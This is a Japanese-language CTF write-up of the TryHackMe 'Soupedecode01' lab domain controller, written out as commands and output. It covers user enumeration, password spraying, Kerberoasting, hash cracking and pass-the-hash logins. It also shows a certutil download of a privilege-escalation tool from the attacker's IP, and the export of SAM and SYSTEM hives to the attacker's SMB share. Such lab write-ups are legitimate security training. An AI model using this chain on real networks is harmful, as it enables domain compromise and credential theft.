# Soupedecode01 CTF

https://tryhackme.com/room/soupedecode01

## Enumeration

```shell
TARGET=10.201.57.173
```

### ポートスキャン

```sh
rustscan -a $TARGET

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 124
88/tcp    open  kerberos-sec     syn-ack ttl 124
135/tcp   open  msrpc            syn-ack ttl 124
139/tcp   open  netbios-ssn      syn-ack ttl 124
389/tcp   open  ldap             syn-ack ttl 124
445/tcp   open  microsoft-ds     syn-ack ttl 124
464/tcp   open  kpasswd5         syn-ack ttl 124
593/tcp   open  http-rpc-epmap   syn-ack ttl 124
636/tcp   open  ldapssl          syn-ack ttl 124
3268/tcp  open  globalcatLDAP    syn-ack ttl 124
3269/tcp  open  globalcatLDAPssl syn-ack ttl 124
3389/tcp  open  ms-wbt-server    syn-ack ttl 124
9389/tcp  open  adws             syn-ack ttl 124
49664/tcp open  unknown          syn-ack ttl 124
49666/tcp open  unknown          syn-ack ttl 124
49676/tcp open  unknown          syn-ack ttl 124
49717/tcp open  unknown          syn-ack ttl 124
49803/tcp open  unknown          syn-ack ttl 124
```

```sh
root@ip-10-201-100-162:~# nmap -sV -p53,88,135,139,389,445,464,593,636,3268,3269,3389,9389 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-02 04:07 BST
Stats: 0:00:02 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan
ARP Ping Scan Timing: About 100.00% done; ETC: 04:07 (0:00:00 remaining)
Nmap scan report for ip-10-201-108-185.ec2.internal (10.201.108.185)
Host is up (0.71s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-02 03:07:59Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
9389/tcp open  mc-nmf        .NET Message Framing
```

```sh
$ enum4linux-ng -A $TARGET -oA results.txt
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.201.57.173
[*] Username ......... ''
[*] Random Username .. 'ddgkqyfd'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ======================================
|    Listener Scan on 10.201.57.173    |
 ======================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =====================================================
|    Domain Information via LDAP for 10.201.57.173    |
 =====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: SOUPEDECODE.LOCAL

 ============================================================
|    NetBIOS Names and Workgroup/Domain for 10.201.57.173    |
 ============================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ==========================================
|    SMB Dialect Check on 10.201.57.173    |
 ==========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                                                                 
  SMB 1.0: false                                                                                                    
  SMB 2.02: true                                                                                                    
  SMB 2.1: true                                                                                                     
  SMB 3.0: true                                                                                                     
  SMB 3.1.1: true                                                                                                   
Preferred dialect: SMB 3.0                                                                                          
SMB1 only: false                                                                                                    
SMB signing required: true                                                                                          

 ============================================================
|    Domain Information via SMB session for 10.201.57.173    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC01                                                                                         
NetBIOS domain name: SOUPEDECODE                                                                                    
DNS domain: SOUPEDECODE.LOCAL                                                                                       
FQDN: DC01.SOUPEDECODE.LOCAL                                                                                        
Derived membership: domain member                                                                                   
Derived domain: SOUPEDECODE                                                                                         

 ==========================================
|    RPC Session Check on 10.201.57.173    |
 ==========================================
[*] Check for null session
[-] Could not establish null session: STATUS_ACCESS_DENIED
[*] Check for random user
[+] Server allows session using username 'ddgkqyfd', password ''
[H] Rerunning enumeration with user 'ddgkqyfd' might give more results

 ================================================
|    OS Information via RPC for 10.201.57.173    |
 ================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Skipping 'srvinfo' run, not possible with provided credentials
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016                                                            
OS version: '10.0'                                                                                                  
OS release: ''                                                                                                      
OS build: '20348'                                                                                                   
Native OS: not supported                                                                                            
Native LAN manager: not supported                                                                                   
Platform id: null                                                                                                   
Server type: null                                                                                                   
Server type string: null                                                                                            

[!] Aborting remainder of tests, sessions are possible, but not with the provided credentials (see session check results)                                                                                                               

Completed after 13.49 seconds
```

```sh
 ====================================================
|    Domain Information via RPC for 10.201.57.173    |
 ====================================================
[+] Domain: SOUPEDECODE
[+] Domain SID: S-1-5-21-2986980474-46765180-2505414164
[+] Membership: domain member
```

### ユーザー名列挙

admin, charlie が存在する。2ユーザーのusers.txt を作成。

```sh
$ kerbrute userenum --dc $TARGET -d SOUPEDECODE.LOCAL /usr/share/wordlists/seclists/Usernames/Names/names.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/02/25 - Ronnie Flathers @ropnop

2025/08/02 10:16:48 >  Using KDC(s):
2025/08/02 10:16:48 >   10.201.57.173:88

2025/08/02 10:16:50 >  [+] VALID USERNAME:       admin@SOUPEDECODE.LOCAL
2025/08/02 10:17:22 >  [+] VALID USERNAME:       charlie@SOUPEDECODE.LOCAL
2025/08/02 10:20:02 >  Done! Tested 10177 usernames (2 valid) in 194.365 seconds
```

AS-REP Roasting は無効。

```sh
$ python3 /home/kali/tools/impacket/examples/GetNPUsers.py -dc-ip $TARGET SOUPEDECODE.LOCAL/ -usersfile users.txt
/home/kali/myenv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.13.0.dev0+20250605.14806.5f78065c - Copyright Fortra, LLC and its affiliated companies 

[-] User admin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User charlie doesn't have UF_DONT_REQUIRE_PREAUTH set
```


### SMB

```sh
$ smbclient -L //$TARGET -N                         

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.201.57.173 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

backup, Users が目立つが、権限エラーで表示できない。

smb_lookupsidスキャナを使うと、1000件以上のユーザー名が出てきた。改めて、names.txt として保存。

```sh
$ msfconsole -q -x "use scanner/smb/smb_lookupsid; set rhosts $TARGET; set SMBUser Guest; set SMBPass ''; set THREADS 10; run; exit;"
[*] Using action LOCAL - view all 2 actions with the show actions command
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
rhosts => 10.201.36.65
SMBUser => Guest
SMBPass => 
THREADS => 10
[*] 10.201.36.65:445 - PIPE(lsarpc) LOCAL(SOUPEDECODE - S-1-5-21-2986980474-46765180-2505414164) DOMAIN(SOUPEDECODE - S-1-5-21-2986980474-46765180-2505414164)
[*] Trying RID 4000 / 4000
SMB Lookup SIDs Output
======================

    Type   Name                                     RID
    ----   ----                                     ---
    User   Administrator                            500
    User   Guest                                    501
    User   krbtgt                                   502
    Group  Domain Admins                            512
    Group  Domain Users                             513
    Group  Domain Guests                            514
```

ユーザー名とパスワードが同じパターンを検出。発見した時点で止まるので、ほかにも存在するのかは不明。

```sh
$ crackmapexec smb $TARGET -u ./names.txt -p ./names.txt --no-bruteforce | tee spray.txt

SMB                      10.201.36.65    445    DC01             [+] SOUPEDECODE.LOCAL\[REDACTED]:[REDACTED]
```

backupは見られないが、Usersは見られた。

```sh
$ smbclient //$TARGET/Users -U "SOUPEDECODE.LOCAL\[REDACTED]"
Password for [SOUPEDECODE.LOCAL\[REDACTED]]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Fri Jul  5 07:48:22 2024
  ..                                DHS        0  Thu Jun 19 07:14:47 2025
  admin                               D        0  Fri Jul  5 07:49:01 2024
  Administrator                       D        0  Sat Aug  2 17:34:00 2025
  All Users                       DHSrn        0  Sat May  8 17:26:16 2021
  Default                           DHR        0  Sun Jun 16 11:51:08 2024
  Default User                    DHSrn        0  Sat May  8 17:26:16 2021
  desktop.ini                       AHS      174  Sat May  8 17:14:03 2021
  Public                             DR        0  Sun Jun 16 02:54:32 2024
  [REDACTED]                             D        0  Tue Jun 18 02:24:32 2024
```

Desktop に user.txt があった。

## ケルベロースティング

```sh
$ python3 /home/kali/tools/impacket/examples/GetUserSPNs.py SOUPEDECODE.LOCAL/[REDACTED]:[REDACTED] -dc-ip $TARGET -request
/home/kali/myenv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.13.0.dev0+20250605.14806.5f78065c - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  --------------  --------  --------------------------  ---------  ----------
FTP/FileServer          file_svc                  2024-06-18 02:32:23.726085  <never>               
FW/ProxyServer          firewall_svc              2024-06-18 02:28:32.710125  <never>               
HTTP/BackupServer       backup_svc                2024-06-18 02:28:49.476511  <never>               
HTTP/WebServer          web_svc                   2024-06-18 02:29:04.569417  <never>               
HTTPS/MonitoringServer  monitoring_svc            2024-06-18 02:29:18.511871  <never>               

[-] CCache file is not found. Skipping...
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$39ba2....
$krb5tgs$23$*firewall_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/firewall_svc*$43c19e....
$krb5tgs$23$*backup_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/backup_svc*$3d5cb40da.....
$krb5tgs$23$*web_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/web_svc*$51d85bb....
$krb5tgs$23$*monitoring_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/monitoring_svc*$2c4b1....
```

rockyou.txt で、file_svc のパスワードが判明。

```sh
.\hashcat.exe -m 13100 hash.txt rockyou.txt
```

backupフォルダを見られた。

```sh
$ smbclient //$TARGET/backup -U "SOUPEDECODE.LOCAL\file_svc"             
Password for [SOUPEDECODE.LOCAL\file_svc]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Jun 18 02:41:17 2024
  ..                                 DR        0  Sat Jul 26 02:51:20 2025
  backup_extract.txt                  A      892  Mon Jun 17 17:41:05 2024

                12942591 blocks of size 4096. 10603307 blocks available
```

いくつかのNTLMハッシュを入手。

```sh
$ cat backup_extract.txt     
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
```

それぞれ、SMBでPass-The-Hashが効果あるか確認。

```sh
$ cat ./backup_extract.txt | cut -d: -f4 > hash.txt                        
$ cat ./backup_extract.txt | cut -d: -f1 > hash-names.txt

$ crackmapexec smb $TARGET -u ./hash-names.txt -H ./hash.txt --no-bruteforce | tee smb-hash.txt
SMB                      10.201.51.81    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB                      10.201.51.81    445    DC01             [-] SOUPEDECODE.LOCAL\WebServer$:[REDACTED] STATUS_LOGON_FAILURE 
SMB                      10.201.51.81    445    DC01             [-] SOUPEDECODE.LOCAL\DatabaseServer$:[REDACTED] STATUS_LOGON_FAILURE 
SMB                      10.201.51.81    445    DC01             [-] SOUPEDECODE.LOCAL\CitrixServer$:[REDACTED] STATUS_LOGON_FAILURE 
SMB                      10.201.51.81    445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:[REDACTED] (Pwn3d!)
```

FileServer$ で evil-winrm を使ってログイン。

```sh
$ evil-winrm -i 10.201.51.81 -u 'SOUPEDECODE.LOCAL\FileServer$' -H [REDACTED]
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FileServer$\Documents> 
```

## 権限昇格

フルフルで権限が付いている。

```sh
*Evil-WinRM* PS C:\Users\FileServer$\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

### GodPotato

GodPotatoをダウンロード

```sh
*Evil-WinRM* PS C:\Users\FileServer$\Documents> certutil -URLcache -split -f http://10.13.85.243:8000/god.exe .\god.exe
****  Online  ****
  0000  ...
  e000
CertUtil: -URLCache command completed successfully.
```

マルウェア検出されて失敗。

```sh
*Evil-WinRM* PS C:\Users\FileServer$\Documents> .\god.exe
Program 'god.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+ .\god.exe
+ ~~~~~~~~~.
At line:1 char:1
+ .\god.exe
+ ~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```

### hive

sam, systemハイブを出力してkaliにコピー

```sh
*Evil-WinRM* PS C:\Users\FileServer$\Documents> reg save hklm\sam sam.hive
The operation completed successfully.

*Evil-WinRM* PS C:\Users\FileServer$\Documents> reg save hklm\system system.hive
The operation completed successfully.

*Evil-WinRM* PS C:\Users\FileServer$\Documents> cp sam.hive \\10.13.85.243\public\
*Evil-WinRM* PS C:\Users\FileServer$\Documents> cp system.hive \\10.13.85.243\public\
```

Administrator のNTLMハッシュを入手。しかし、様々な方法でPass-The-Hashを試したが、ログインエラーになる。

```sh
$ python /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x0c7ad5e1334e081c4dfecd5d77cc2fc6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
Guest:501:aad3b435b51404eeaad3b435b51404ee::[REDACTED]:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee::[REDACTED]:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up... 
```

hashcat でパスワードもクラックできたが、そのパスワードを使ってもログインできなかった。

さんざん悩んだ挙句、FileServer$ ユーザーのままで Administratorフォルダに入れることに気づいて root.txt を入手。

## 振り返り

- RID2000番台以降まで探査しなければならないこともあると学習した。
- username=password でスプレーするパターンは初見。
- SMBでパスワードスプレーする感覚が重要だと感じた。
